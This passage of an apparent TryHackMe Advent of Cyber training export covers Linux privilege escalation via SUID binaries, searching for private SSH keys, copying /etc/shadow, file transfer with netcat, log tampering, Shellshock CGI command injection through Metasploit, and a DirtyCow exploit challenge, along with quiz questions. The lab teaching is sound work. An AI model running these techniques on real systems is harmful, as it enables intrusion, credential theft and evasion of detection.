-name id_rsa 2&gt; /dev/null</code>....Let\'s break this down:</p><ul><li>We\'re using\xa0<code style="font-size:14px">find</code>\xa0to search the volume, by specifying the root (<code style="font-size:14px">/</code>) to search for files named "<span style="font-weight:bolder">id_rsa</span>" which is the name for\xa0<em>private</em>\xa0SSH keys, and then using\xa0<code style="font-size:14px">2&gt; /dev/null</code>\xa0to only show matches to us.</li></ul><p>Can you think of any other files or folders we may want to\xa0<em>find</em>?<br /><br /></p><h2>11.7. The "Priv Esc Checklist"</h2><p>As you progress through your pentesting journey, you will begin to pick up a certain workflow for how you approach certain stages of an engagement. Whilst this workflow is truly yours, it will revolve around some fundamental steps in looking for vulnerabilities for privilege escalation.</p><ol><li>Determining the kernel of the machine (kernel exploitation such as Dirtyc0w)</li><li>Locating other services running or applications installed that may be abusable (SUID &amp; out of date software)</li><li>Looking for automated scripts like backup scripts (exploiting crontabs)</li><li>Credentials (user accounts, application config files..)</li><li>Mis-configured file and directory permissions</li></ol><p>Checkout some checklists that can be used as a cheatsheet for the enumeration stage of privilege escalation:</p><ul><li><a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation">g0tmi1k</a></li><li><a href="https://payatu.com/guide-linux-privilege-escalation">payatu</a></li><li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md#linux---privilege-escalation">PayloadAllTheThings</a></li></ul><h2>11.8. Vulnerability: SUID 101</h2><p>For today\'s material, we\'re going to be showcasing the resource that is\xa0<a href="https://gtfobins.github.io/">GTFOBins</a>\xa0and explaining how the misconfigured permissions of applications can be exploited to escalate our privileges to an administrator.</p><p>Firstly, this begs the question...what is SUID exactly? Well, let\'s get on the same page by detailing how permissions work in Linux exactly. A benefit of Linux is its granularity in file permissions - they are, however, rather intimidating to approach. When performing commands like\xa0<code style="font-size:14px">ls -l</code>\xa0to list the permissions of our current directory:</p><p><img src="https://assets.tryhackme.com/additional/cmn-aoc2020/day-12/img5.png" alt /></p><pre style="font-size:14px"><code>\xa0 \xa0[A]\xa0 \xa0 \xa0 \xa0 \xa0[B]\xa0 \xa0 \xa0[C]<br />drwxrwxr-x 2 cmnatic cmnatic 4096 Dec 8 18:33 exampledir <br />drwxrwxr-x 2 cmnatic cmnatic 4096 Dec 8 18:33 exampledir2 <br />drwxrwxr-x 2 cmnatic cmnatic 4096 Dec 8 18:33 exampledir3 <br />-rw-rw-r-- 1 cmnatic cmnatic 0 Dec 8 18:33 examplefile <br />-rw-rw-r-- 1 cmnatic cmnatic 0 Dec 8 18:33 examplefile2 <br />-rw-rw-r-- 1 cmnatic cmnatic 0 Dec 8 18:33 examplefile3</code></pre><p>Our directory has three directories "<span style="font-weight:bolder">exampledir</span>[3]" and three files "<span style="font-weight:bolder">examplefile</span>[3]". I\'ve listed the four columns of interest here:</p><table class="table table-bordered"><tbody><tr><td>Column Letter</td><td>Description</td><td>Example</td></tr><tr><td>[A]</td><td>filetype (<code style="font-size:14px">d</code>\xa0is a directory\xa0<code style="font-size:14px">-</code>\xa0is a file) and the user and group permissions "<span style="font-weight:bolder">r</span>" for reading, "<span style="font-weight:bolder">w</span>" for write and "<span style="font-weight:bolder">x</span>" for executing.<br /></td><td>A file with\xa0<code style="font-size:14px">-rw-rw-r--</code>\xa0is read/write to the user and group only. However, every other user has read access only<br /></td></tr><tr><td>[B]<br /></td><td>the user who owns the file<br /></td><td>cmnatic (system user)<br /></td></tr><tr><td>[C]<br /></td><td>the group (of users) who owns the file<br /></td><td>sudoers group<br /></td></tr></tbody></table><p><br />At the moment, the "examplefiles" are not executable as there is no "<span style="font-weight:bolder">x</span>" present for either the user or group. When setting the executable permission (<code style="font-size:14px">chmod +x filename</code>), this value changes (note the "<span style="font-weight:bolder">x</span>" in the snippet below -rw<span style="font-weight:bolder">x</span>rw<span style="font-weight:bolder">x</span>r):</p><pre style="font-size:14px"><code>-rwxrwxr-x 1 cmnatic cmnatic 0 Dec 8 18:43 backup.sh\xa0</code></pre><p>Normally, executables and commands (commands are just shortcuts to executables) will execute as the user who is running them (assuming they have the file permissions to do so.) This is why some commands such as changing a user\'s password require <code>sudo</code> in front of them. The\xa0<code style="font-size:14px">sudo</code>\xa0allows you to execute something with the permissions as root (the most privileged user). Users who can use\xa0<code style="font-size:14px">sudo</code>\xa0are called\xa0<span style="font-weight:bolder">"sudoers"</span>\xa0and are listed in\xa0<code style="font-size:14px">/etc/sudoers</code>\xa0(we can use this to help identify valuable users to us).</p><p>SUID is simply a permission added to an executable that does a similar thing as sudo. However, instead, allows users to run the executable as whoever owns it as demonstrated below:</p><table><thead><tr><th></th><th></th><th></th><th></th></tr></thead><tbody><tr><td></td><td></td><td></td><td><p><br /></p><table class="table table-bordered"><tbody><tr><td>Filename</td><td>File Owner</td><td>User who is executing the file</td><td>User that the file is executed as</td></tr><tr><td>ex1</td><td>root</td><td>cmnatic</td><td>root</td></tr><tr><td>ex2</td><td>cmnatic</td><td>cmnatic</td><td>cmnatic</td></tr><tr><td>ex3</td><td>service</td><td>danny</td><td>service</td></tr></tbody></table><p><br /></p></td></tr></tbody></table><p>Suddenly with the introduction of SUID, users no longer have to be a sudoer to run an executable as root. This can be legitimately used to allow applications that specific privileges to run that another user can\'t have.<br /><br /></p><h2>11.9. Abusing SUID (GTFOBins)</h2><p>Now that we understand why executables with this SUID permission are so enticing, let\'s begin to learn how to find these and understand the capabilities we can do with some of these executables. At the surface, SUID isn\'t inherently insecure. It\'s only when you factor in the misconfiguration of permissions (and given the complexity on Linux - is very easy to do); Administrators don\'t adhere to the rule of least privileges when troubleshooting.</p><p>Executables that are capable of interacting with the operating system such as reading/writing files or creating shells are goldmines for us. Thankfully,\xa0<a href="https://gtfobins.github.io/">GTFOBins is a website</a>\xa0that lists a majority of applications that do such actions for us. Let\'s set the SUID on the\xa0<code style="font-size:14px">cp</code>\xa0command that is used to copy files with\xa0<code style="font-size:14px">chmod u+s /usr/bin/cp</code></p><p><img src="https://assets.tryhackme.com/additional/cmn-aoc2020/day-12/img6.png" alt /></p><p>Note how the\xa0<code style="font-size:14px">cp</code>\xa0executable is owned by "root" and now has the SUID permission set:</p><p><code>cmnatic@docker-ubuntu-s-1vcpu-1gb-lon1-01:~$ <b>ls -al /usr/bin</b> | grep "<b>cp</b>"<br />-rwsr-xr-x 1 root root 153976 Sep 5 2019 <b>cp</b></code></p><p>The\xa0<code style="font-size:14px">cp</code>\xa0command will now be executed as root - meaning we can copy any file on the system. Some locations may be of interest to us:</p><ul><li>copying the contents of other user directories (i.e. bash history, ssh keys, user.txt)</li><li>copying the contents of the "<span style="font-weight:bolder">/root</span>" directory (i.e.\xa0<span style="font-weight:bolder">"/root/flag.txt"</span>)</li><li>copy the "<span style="font-weight:bolder">/etc/passwd</span>" &amp; "<span style="font-weight:bolder">/etc/shadow</span>" files for password cracking</li></ul><p>Let\'s confirm this by using find to search the machine for executables with the SUID permission set:\xa0<code style="font-size:14px">find / -perm -u=s -type f 2&gt;/dev/null</code></p><p><img src="https://assets.tryhackme.com/additional/cmn-aoc2020/day-12/img8.png" alt /></p><p>And now using\xa0<code style="font-size:14px">cp</code>\xa0to copy the contents of\xa0<span style="font-weight:bolder">"/root"</span>\xa0into our directory ("<span style="font-weight:bolder">/home/cmnatic</span>"):<br /><img src="https://assets.tryhackme.com/additional/cmn-aoc2020/day-12/img9.png" alt /><br /><br /></p><h2>11.10. Introducing Enumeration Scripts (Doing the leg work for us...)</h2><p>Fortunately for us, there are many enumeration scripts available to use that automate some of the enumeration processes for us. We can download these onto our own machine and use a few methods to upload them to our vulnerable target instance. Bear in mind that vulnerable target Instances that you deploy on TryHackMe do not have internet access, so we must use our own attacking machine that is connected to the THM network.</p><p>A great script that is essential to anyone\'s toolkit is "LinEnum" that is available for download from\xa0<a href="https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh">here</a>.\xa0<em>LinEnum</em>\xa0enumerates the target machine for us, detailing and collating useful information such as kernel versions, permissions to any executables or files that are outside of the users home directory - and a whole plethora more!</p><p>The problem with this? It\'s easy to get lost within it all. Enumeration scripts often return lots of information that is often not all that useful to us; It\'s important to understand how these enumeration scripts work so as not to rely on them. However, these scripts make privilege escalation that much more approachable for beginners.</p><p><span style="font-weight:bolder">11.10.1.</span>\xa0Let\'s download the\xa0<a href="https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh">LinEnum</a>\xa0script to our own machine using\xa0<code style="font-size:14px">wget</code>:<br /><img src="https://assets.tryhackme.com/additional/cmn-aoc2020/day-12/e1.png" alt /></p><p><span style="font-weight:bolder">11.10.2.</span>\xa0Let\'s use Python3 to turn our machine into a web server to serve the\xa0<em>LinEnum.sh</em>\xa0script to be downloaded onto the target machine. Make sure you run this command in the same directory that you downloaded\xa0<em>LinEnum.sh</em>\xa0to:\xa0<code style="font-size:14px">python3 -m http.server 8080</code><br /><img src="https://assets.tryhackme.com/additional/cmn-aoc2020/day-12/e2.png" alt /></p><p><img src="https://assets.tryhackme.com/additional/cmn-aoc2020/day-12/e3.png" alt /></p><p><span style="font-weight:bolder">11.10.3.</span>\xa0We need to upload this to the vulnerable Instance (MACHINE_IP) whilst ensuring that our own device is connected to the THM network. There are many ways this can be done which will depend on the vulnerable Instance you are attacking; the vulnerable Instance may not have tools such as\xa0<code style="font-size:14px">wget</code>, so alternatives will need to be used.</p><p><span style="font-weight:bolder">11.10.3.1.</span>\xa0Navigate to a directory that we will have write permission to. The\xa0<code style="font-size:14px">/tmp</code>\xa0directory allows all users to write to it - so we will use this.</p><p><span style="font-weight:bolder">11.10.3.2.</span>\xa0Using\xa0<code style="font-size:14px">wget</code>\xa0on the vulnerable Instance:<br /><img src="https://assets.tryhackme.com/additional/cmn-aoc2020/day-12/e4.png" alt /></p><p><span style="font-weight:bolder">11.10.3.3.</span>\xa0Using\xa0<code style="font-size:14px">netcat</code>:</p><p><span style="font-weight:bolder">11.10.3.3.1.</span>\xa0Setup netcat on the vulnerable Instance to listen for an incoming file:\xa0<code style="font-size:14px">nc -l -p 1337 &gt; LinEnum.sh</code><br /><img src="https://assets.tryhackme.com/additional/cmn-aoc2020/day-12/e6.png" alt /></p><p><span style="font-weight:bolder">11.10.3.3.2.</span>\xa0Setup netcat on our own machine to send a file:\xa0<code style="font-size:14px">nc -w -3 MACHINE_IP 1337 &lt; LinEnum.sh</code><br /><img src="https://assets.tryhackme.com/additional/cmn-aoc2020/day-12/e7.png" alt /></p><p><span style="font-weight:bolder">11.10.3.4.</span>\xa0Add the execution permission to\xa0<em>LinEnum.sh\xa0</em>on the vulnerable Instance<span style="font-size:1rem">:\xa0</span><code style="font-size:14px">chmod +x LinEnum.sh</code></p><p><span style="font-weight:bolder">11.10.3.5.</span>\xa0Execute\xa0<em>LinEnum.sh</em>\xa0on the vulnerable Instance:\xa0<code style="font-size:14px">./LinEnum.sh</code><br /><img src="https://assets.tryhackme.com/additional/cmn-aoc2020/day-12/e5.png" alt /><br /><br /></p><h2>11.11. Covering our Tracks</h2><p>The final stages of penetration testing involve setting up persistence and covering our tracks. For today\'s material, we\'ll detail the later as this is not mentioned nearly enough.</p><p>During a pentesting engagement, you will want to try to avoid detection from the administrators &amp; engineers of your client wherever within the permitted scope of the pentesting engagement. Activities such as logging in, authentication and uploading/downloading files are logged by services and the system itself.</p><p>On Debian and Ubuntu, the majority of these are left within the "<span style="font-weight:bolder">/var/log</span>\xa0directory and often require administrative privileges to read and modify. Some log files of interest:</p><ul><li>"<span style="font-weight:bolder">/var/log/auth.log</span>" (Attempted logins for SSH, changes too or logging in as system users:)</li></ul><p><img src="https://assets.tryhackme.com/additional/cmn-aoc2020/day-12/img10.png" alt /></p><ul><li>"<span style="font-weight:bolder">/var/log/syslog</span>" (System events such as firewall alerts:)</li></ul><p><img src="https://assets.tryhackme.com/additional/cmn-aoc2020/day-12/img11.png" alt /></p><ul><li>"<span style="font-weight:bolder">/var/log/&lt;service/"</span></li><li>For example, the access logs of apache2<ul><li><span style="font-weight:bolder">/var/log/apache2/access.log"</span><br /><img src="https://assets.tryhackme.com/additional/cmn-aoc2020/day-12/img12.png" alt /></li></ul></li></ul><h2>11.12. Challenge</h2><p>Ensure that you have deployed the instance attached to this task and take note of the IP address (MACHINE_IP). Answer Question #1 and #2 before proceeding to log into the vulnerable instance. You have already been provided with the credentials to use to log into the vulnerable instance in Question #3.</p><p>Apply your newly found knowledge from this task to escalate your privileges! Study the hints carefully if needed - everything to complete this day has been discussed throughout today\'s task.</p><p>Want to hone-in your skills? I highly recommend checking out the new "<a href="https://tryhackme.com/module/privilege-escalation-and-shells" target="_blank">Privilege escalation and shells</a>" module on TryHackMe. <a href="https://tryhackme.com/hacktivities" target="_blank">Modules</a> provide a guided-style of learning for all users, similarly to the<a href="https://tryhackme.com/paths" target="_blank"> subscriber Pathways</a>.\xa0</p>\n', 'taskType': 'vm', 'taskNo': 13, 'taskCreated': '2020-11-12T02:48:28.567Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '5fd105bb46fb6b700922cc81', 'questions': [{'questionNo': 1, 'question': '<p>What type of privilege escalation involves using a user account to execute commands as an administrator?</p>', 'hint': ''}, {'questionNo': 2, 'question': '<p>What is the name of the file that contains a list of users who are a part of the <code>sudo</code> group?</p>', 'hint': ''}, {'questionNo': 3, 'question': '<p>Use SSH to log in to the vulnerable machine like so: <code>ssh cmnatic@MACHINE_IP</code> </p><p>\n\nInput the following password when prompted: <b>aoc2020</b><br /></p>', 'hint': ''}, {'questionNo': 4, 'question': '<p>Enumerate the machine for executables that have had the SUID permission set. Look at the output and use a mixture of <a href="https://gtfobins.github.io/" target="_blank">GTFObins</a> and your researching skills to learn how to exploit this binary.</p><p>You may find uploading some of the enumeration scripts that were used during today\'s task to be useful.<br /></p>', 'hint': 'Refer back to section 11.7 if you are stuck. Remember that we can use this find command to find executables that have the SUID bit set:\n\nfind / -perm -u=s -type f 2>/dev/null'}, {'questionNo': 5, 'question': '<p>Use this executable to launch a system shell as root. <br /><br />What are the contents of the file located at<b> /root/flag.txt</b>?<br /></p>', 'hint': 'You can use "whereis <command_name>" to find the location of a command.'}]}, {'taskTitle': '[Day 12] <span class="badge badge-soft-warning size-16">Networking</span> Ready, set, elf.', 'taskDesc': '<p><span>\ufeff</span><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/60/Sleep.svg/1280px-Sleep.svg.png" alt style="width:25%;float:right" class="note-float-right" />\n<u><span class="size" style="font-size:18px"><b>Day 12: Ready, set, elf. - Prelude:</b></span></u></p><p>\nChristmas is fast approaching, yet, all remain silent at <em>The Best Festival Company</em> (TBFC). What gives?! The cheek of those elves - slacking at the festive period! Santa has no time for slackers in his workshop. After all, the sleigh won\'t fill itself, nor will the good and naughty lists be sorted. Santa has tasked you, Elf McEager, with whacking those elves back in line.</p><a href="https://www.youtube.com/watch?v=6DOp2Fn1AsQ" target="_blank">Watch DarkStar\'s video on solving this task!</a><br /><br />\n<p><u><span class="size" style="font-size:18px">12.1. Getting Started:</span></u><br />\nBefore we begin, we\'re going to need to deploy two Instances:</p>\n<ol>\n<li>The THM AttackBox by pressing the "<span style="display:inline-block"><span class="far fa-laptop"></span>\xa0<strong>Start AttackBox</strong>" button at the top-right of the page.</span></li>\n<li><span style="display:inline-block"></span>\xa0<span class="size" style="font-size:1rem">The vulnerable Instance attached to this task by pressing the "<strong>Deploy</strong>" button at the top-right of this task/day</span></li></ol><p><u>12.2. Todays Learning Objectives:</u></p><p>\n<span class="size" style="font-size:1rem">We\'re going to be applying some of the skills and techniques we previously explored in this year\'s Advent of Cyber. Let\'s put on our\xa0</span><span class="size" style="font-size:1rem">enumeration caps, crack our knuckles and get hands-on with learning about, discovering and exploiting an interesting functionality of web servers.</span><br />\n</p><p>Made with\xa0❤ by\xa0<a href="https://tryhackme.com/p/cmnatic">CMNatic</a></p><ol>\n</ol>\n<hr />\n<p><span class="size" style="font-size:1rem"></span></p>\n<p><br />\n<u><span class="size" style="font-size:18px">12.3. Vulnerability...reveal yourself!</span></u><br />\nAs an application\'s lifecycle continues, so does its version numbering. Applications contain seemingly innocent hallmarks of information such as version numbering. Known as information disclosure, these nuggets of information are handed to us by the server through error messages such as in the following screenshot, HTTP headers or even on the website itself.</p>\n<p><img src="https://assets.tryhackme.com/additional/cmn-aoc2020/day-13/img1.png" alt /></p>\n<p><span class="size" style="font-size:1rem">An attacker can use knowledgebases such as <a href="http://rapid7.com/">Rapid7</a>, <a href="https://attackerkb.com/">AttackerKB</a>, <a href="https://cve.mitre.org/cve/">MITRE</a> or <a href="http://exploit-db.com/">Exploit-DB</a> to look for vulnerabilities associated with the version number of that application. Vulnerabilities are attributed by a CVE number. You can learn more about these in <a href="https://tryhackme.com/room/introtoresearch">MuirlandOracle\'s Intro to Research room</a>.</span></p>\n<p><img src="https://assets.tryhackme.com/additional/cmn-aoc2020/day-13/img2.png" alt style="width:1016.64px;height:394.597px" /><br />\n<u><span class="size" style="font-size:18px"></span></u><br />\n<u><span class="size" style="font-size:18px">12.4. Everything CGI (And no, not the movie kind...)</span></u><br />\n<span class="size" style="font-size:1rem">As you may have discovered throughout the "Web" portion of the event, webservers don\'t just display websites...They are capable of interacting with the operating system directly.\xa0</span><span class="size" style="font-size:1rem">The Common Gateway Interface or CGI for short is a standard means of communicating and processing data between a client such as a web browser to a web server.</span><br />\n<span class="size" style="font-size:1rem"></span></p>\n<p><span class="size" style="font-size:1rem">Simply, this technology facilitates interaction with programmes such as Python script files, C++ and Java application, or system commands all within the browser - as if you were executing it on the command line.</span></p>\n<p><img src="https://www.tcl.tk/man/aolserver3.0/cgi.gif" alt /><br />\n(<a href="https://www.tcl.tk/man/aolserver3.0/cgi-ch1.htm">America Online., 1999</a>)</p>\n<p><span class="size" style="font-size:1rem">Despite their age, CGI scripts are still relied upon from devices such as embedded computers to IoT devices, Routers, and the likes, who can\'t run complex frameworks like PHP or Node.</span></p><p><span class="size" style="font-size:1rem"><br /></span></p>\n<p><u><span class="size" style="font-size:18px">12.5. The Nitty Gritty</span></u><br />Whilst CGI has the right intentions and use cases, this technology can quickly be abused by people like us!\xa0<span class="size" style="font-size:1rem">The commonplace for CGI scripts to be stored is within the\xa0</span><strong>/cgi-bin/</strong><span class="size" style="font-size:1rem">\xa0folder on a webserver. Take, for example, this\xa0</span><strong>systeminfo.sh</strong><span class="size" style="font-size:1rem">\xa0file that displays the date, time and the user the webserver is running as:</span></p>\n<p><img src="https://assets.tryhackme.com/additional/cmn-aoc2020/day-13/img3.png" alt style="width:945.477px;height:199px" /></p>\n<p><span class="size" style="font-size:1rem">When navigating to the location of this script using our browser, the script is executed on the web server, the resulting output of this is then displayed to us. How could we use this?</span></p>\n<p><span class="size" style="font-size:1rem"></span></p>\n<p><u><span class="size" style="font-size:18px">12.6. As We\'ve Demonstrated...</span></u><br />\n<span class="size" style="font-size:1rem">We could, perhaps, parse our own commands through to this script that will be executed. Because we know that this is a Ubuntu machine,\xa0 we can try some Linux commands like\xa0</span><code>ls</code><span class="size" style="font-size:1rem">\xa0to list the contents of the working directory:</span></p>\n<p><img src="https://assets.tryhackme.com/additional/cmn-aoc2020/day-13/img4.png" alt style="width:971.556px;height:232.68px" /><br />\n</p><p><span class="size" style="font-size:1rem">Or on a Windows machine, the\xa0</span><code>systeminfo</code><span class="size" style="font-size:1rem">\xa0command reveals some useful information:</span></p>\n<p><img src="https://assets.tryhackme.com/additional/cmn-aoc2020/day-13/img5.png" alt /></p>\n<p>This is achieved by parsing the command as an argument with <code>?&amp;</code>\xa0<strong>i.e.</strong>\xa0<code>?&amp;ls</code>. As this is a web server, any spaces or special characters will need to be <a href="https://www.techopedia.com/definition/10346/url-encoding">URL encoded</a>.</p><p>\n<u><span class="size" style="font-size:18px">12.7. There are tools for this! Practical Metasploit</span></u><br /><span class="size" style="font-size:1rem">Now we understand the application that\'s running, tools such as Metasploit can be used to confirm suspicions and hopefully leverage them! After some independent research, this application is vulnerable to the <a href="https://securityintelligence.com/articles/shellshock-vulnerability-in-depth/">ShellShock attack</a> (<a href="https://nvd.nist.gov/vuln/detail/CVE-2014-6271">CVE 2014-6271</a>)</span></p>\n<p><span class="size" style="font-size:1rem">Let\'s start Metasploit\'s console and use the ShellShock payload. (TryHackMe\'s <a href="https://tryhackme.com/room/rpmetasploit">room</a> and <a href="https://blog.tryhackme.com/metasploit/">blog post</a> on Metasploit will be useful here)</span></p>\n<p><span class="size" style="font-size:1rem">At the minimum, when using an exploit, Metasploit needs to know two things:</span></p>\n<ul>\n<li><span class="size" style="font-size:1rem">Your machine (such as the TryHackMe AttackBox) that you\'re attacking <em>from</em> (<strong>LHOST</strong>)</span></li>\n<li>The target that you\'re attacking (<strong>RHOST(S)</strong>)</li>\n</ul>\n<p>Exploits will have their own individual settings that you will need to configure. We can list these by using the <code>options</code> command, then using <code>set OPTION VALUE</code> accordingly. In our example, the exploit\xa0<span class="size" style="font-size:1rem">involves CGI scripts and as such, we must specify the location of the script on the webserver that we\'re attacking. In the example so far, this was at\xa0</span><a href="http://10.0.0.1/cgi-bin/systeminfo.sh">http://10.0.0.1/cgi-bin/systeminfo.sh</a></p>\n<p><span class="size" style="font-size:1rem">In order for the attack used as the example in this task to work, the options would be set like so:</span></p>\n<ul>\n<li><span class="size" style="font-size:1rem"><strong>LHOST</strong> - <em>10.0.0.10</em> (our PC)</span></li>\n<li><strong>RHOST</strong> - <em>10.0.0.1</em> (the remote PC)</li>\n<li><strong>TARGETURI</strong> <em>/cgi-bin/systeminfo.sh</em> (the location of the script)</li>\n</ul>\n<p><img src="https://assets.tryhackme.com/additional/cmn-aoc2020/day-13/options.png" alt /><br />\n<em>Please note that these options are for the exploit used as an example, you will have to set these values accordingly for the challenge.</em></p>\n<p>After ensuring our options are <code>set </code> right, Let\'s run the exploit to get a Meterpreter connection...Success!</p>\n<p><img src="https://assets.tryhackme.com/additional/cmn-aoc2020/day-13/img6.png" alt /></p>\n<p>To run system commands on the host, we will use <code>shell</code>. By creating a shell on the remote host, we can run system commands as if it were our own PC.</p>\n<p><img src="https://assets.tryhackme.com/additional/cmn-aoc2020/day-13/img7.png" alt /></p>\n<p><span class="size" style="font-size:1rem">I highly recommend the <a href="https://tryhackme.com/room/rpmetasploit">RP: Metasploit</a> room if you wish to delve into this wonderful framework further.\xa0</span></p><p>\n<u><span class="size" style="font-size:18px">12.8. It\'s Challenge Time</span></u><br /><span class="size" style="font-size:1rem">To solve Elf McSkidy\'s problem with the elves slacking in the workshop, he has created the CGI script: <strong>elfwhacker.bat</strong></span></p>\n<p><span class="size" style="font-size:1rem"><strong>Deploy the instance attached to this task</strong>, u</span><span class="size" style="font-size:1rem">se your NMAP skills from "<em>Day 8 - What\'s Under the Christmas Tree?</em>\xa0 to find out what port the webserver </span><code>MACHINE_IP</code><span class="size" style="font-size:1rem"> is running on...Visit the application and discover the installation version, weaponise this information by searching knowledgebases for exploits and Meterpreter payloads possible and whack those elves!.</span><br />\n</p><p style="text-align:center"><br /></p><p style="text-align:center"><b>As this is a Windows machine, please allow a minimum of five minutes for it to deploy before beginning your enumeration.</b></p><p style="text-align:center"><br /></p><p style="text-align:center"><span class="size" style="font-size:1rem"><em>Bonus: There are at least two ways of escalating your privileges after you gain entry. Find these out and pivot at your leisure! (please note that this is optional for the day should you fancy the challenge...)</em></span></p>\n<p><span class="size" style="font-size:18px"><u>12.9. Where to go from here<br /></u></span><br />\n<span class="size" style="font-size:1rem"><a href="https://tryhackme.com/room/attackerkb">DarkStar7471\'s\xa0 AttackerKB Room</a></span></p>\n<p><a href="https://tryhackme.com/room/mitre">Heavenraiza\'s MITRE room</a></p>\n<p><a href="https://tryhackme.com/room/rpmetasploit">DarkStar7471\'s RP:Metasploit Room</a></p>\n', 'taskType': 'vm', 'taskNo': 14, 'taskCreated': '2020-11-12T02:48:37.178Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '5fd63b998c73749d3082226b', 'questions': [{'questionNo': 1, 'question': '<p>What is the version number of the web server?<br /></p>\n', 'hint': 'Remember where we discussed that version numbers can be left behind?'}, {'questionNo': 2, 'question': '<p>What CVE can be used to create a Meterpreter entry onto the machine? (Format: CVE-XXXX-XXXX)<br /></p>', 'hint': 'Use your researching skills to find the metasploit payload for  "Apache Tomcat 9.0" CGI" . Double-check the configured "options " in Metasploit and \nRefer to the cheatsheet if you are struggling with commands after exploitation.'}, {'questionNo': 3, 'question': '<p>Set your Metasploit settings appropriately and gain a foothold onto the deployed machine.<br /></p>', 'hint': ''}, {'questionNo': 4, 'question': '<p>What are the contents of flag1.txt<br /></p>', 'hint': 'Use your researching skills to find out how to output the contents of a file for the Operating System of the server you have exploited'}, {'questionNo': 5, 'question': '<p>Looking for a challenge? Try to find out some of the vulnerabilities present to escalate your privileges!</p>', 'hint': 'Metasploit has post exploit suggestion scripts that may show your the "PATH"'}]}, {'taskTitle': '[Day 13] <span class="badge badge-soft-warning size-16">Networking</span> Coal for Christmas', 'taskDesc': '<p></p><div style="text-align:center"><img src="https://johnhammond.org/static/misc/coal.png" alt style="font-size:1rem" /></div><div style="text-align:center"><span style="font-size:20px"><b>Day 13: Coal For Christmas</b></span></div><div style="text-align:center"><span style="font-size:1rem">Prove these sysadmins deserve coal for Christmas!</span></div><div style="text-align:center"><span style="font-size:1rem"><br /></span></div><div style="text-align:center"><span style="font-size:1rem"><a href="https://www.youtube.com/watch?v=LSRhro8x2mQ" target="_blank">Watch JohnHammond\'s video on solving this task!</a></span></div><p></p>\n', 'taskType': 'vm', 'taskNo': 15, 'taskCreated': '2020-11-12T02:47:50.310Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '5fb97f2bb4296611906c685a', 'questions': [{'questionNo': 1, 'question': '<p>Hi Santa, hop in your sleigh and deploy this machine!</p>\n', 'hint': ''}, {'questionNo': 2, 'question': '<p>The Christmas GPS now says this house is at the address MACHINE_IP. Scan this machine with a port-scanning tool of your choice.</p>\n<p><strong>Port Scanning</strong></p>\n<p>We will begin by scanning the machine. If you are working from the TryHackMe "Attackbox" or from a Kali Linux instance (or honestly, any Linux distribution where you have this installed), you can use <strong>nmap</strong> with syntax like so:<br />\n<br /></p>\n<pre><code>nmap MACHINE_IP\n</code></pre>\n', 'hint': ''}, {'questionNo': 3, 'question': '<p>What old, deprecated protocol and service is running?</p>\n', 'hint': ''}, {'questionNo': 4, 'question': '<p><strong>Initial Access</strong></p>\n<p>Connect to this service to see if you can make use of it. You can connect to the service with the standard command-line client, named after the name of the service, or <strong>netcat</strong>\xa0with syntax like this:</p>\n<pre><code>telnet MACHINE_IP &lt;PORT_FROM_NMAP_SCAN&gt;\n</code></pre>\n<p>What credential was left for you?</p>\n', 'hint': 'Enter just the password.'}, {'questionNo': 5, 'question': '<p><strong>Enumeration</strong></p>\n<p>Looks like you can slide right down the chimney! Log in and take a look around, enumerate a bit. You can view files and folders in the current directory with <strong>ls</strong>, change directories with <strong>cd</strong>\xa0and view the contents of files with <strong>cat</strong>.</p>\n<p>Often to enumerate you want to look at pertinent system information, like the version of the operating system or other release information. You can view some information with commands like this:</p><pre style="font-size:14px"><code>cat /etc/*release</code></pre><pre style="font-size:14px"><code>uname -a\xa0</code></pre><pre style="font-size:14px"><code>cat /etc/issue\xa0</code></pre>\n<p>There is a great list of commands you can run for enumeration here:\xa0<a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/">https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/</a></p>\n<p>What distribution of Linux and version number is this server running?</p>\n', 'hint': ''}, {'questionNo': 6, 'question': '<p>This is a very\xa0<em>old</em>\xa0version of Linux! This may be vulnerable to some kernel exploits, that we could use to escalate our privileges.</p>\n<p>Take a look at the cookies and milk that the server owners left for you. You can do this with the <strong>cat</strong>\xa0command as mentioned earlier.</p>\n<p>cat cookies_and_milk.txt</p>\n<p>Who got here first?</p>\n', 'hint': 'Enter just his name, in lowercase.'}, {'questionNo': 7, 'question': '<p>The perpetrator took half of the cookies and milk! Weirdly enough, that file looks like C code...</p>\n<p>That C source code is a portion of a kernel exploit called <strong>DirtyCow</strong>.\xa0Dirty COW (CVE-2016-5195) is a privilege escalation vulnerability in the Linux Kernel, taking advantage of a race condition that was found in the way the Linux kernel\'s memory subsystem handled the copy-on-write (COW) breakage of private read-only memory mappings. An unprivileged local user could use this flaw to gain write access to otherwise read-only memory mappings and thus increase their privileges on the system.</p>\n<p>You can learn more about the DirtyCow exploit online here:\xa0<a href="https://dirtycow.ninja/">https://dirtycow.ninja/</a></p>\n<p>This <strong>cookies_and_milk.txt</strong>\xa0file looks like a modified rendition of a DirtyCow exploit, usually written in C. Find a copy of that original file online, and get it on the target box. You can do this with some simple file transfer methods like netcat, or spinning up a quick Python HTTP server... or you can simply copy-and-paste it into a text editor on the box!</p>\n', 'hint': ''}, {'questionNo': 8, 'question': '<p>You can compile the C source code on the target with <strong>gcc</strong>. You might need to supply specific parameters or arguments to include different libraries, but thankfully, the DirtyCow source code will explain what syntax to use.</p>\n<p>What is the verbatim syntax you can use to compile, taken from the real C source code comments?</p>\n', 'hint': 'Use the `dirty.c` name, as given in the source code.'}, {'questionNo': 9, 'question': '<p><strong>Privilege Escalation</strong></p>\n<p>Run the commands to compile the exploit, and run it.</p>\n<p>What "new" username was created, with the default operations of the real C source code?</p>\n', 'hint': ''}, {'questionNo': 10, 'question': '<p>Switch your user into that new user account, and hop over to the /root directory to own this server!</p>\n<p>You can switch user accounts like so:</p>\n<p>su &lt;user_to_change_to&gt;</p>\n', 'hint': ''}, {'questionNo': 11, 'question': '<p>Uh oh, looks like that perpetrator left a message! Follow his instructions to prove you really did leave Coal for 